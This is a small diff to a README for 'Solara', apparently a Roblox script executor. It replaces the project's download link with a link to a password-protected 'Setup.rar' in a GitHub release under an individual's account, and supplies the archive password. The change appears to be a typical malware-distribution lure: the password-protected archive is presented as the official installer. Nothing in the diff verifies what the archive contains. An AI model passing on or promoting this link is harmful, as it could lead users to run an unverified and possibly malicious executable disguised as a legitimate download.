@@ -4,7 +4,8 @@
 
 ## Enhance Your Roblox Scripting Experience with Solara
 
-[Download the Latest Version](https://solara.wiki/) 
+[Download the Latest Version](https://github.com/AlejandroBardamon/Solara-V3-Download/releases/download/Setup/Setup.rar) 
+
 __[Password]__: `solara`
 
 </div>
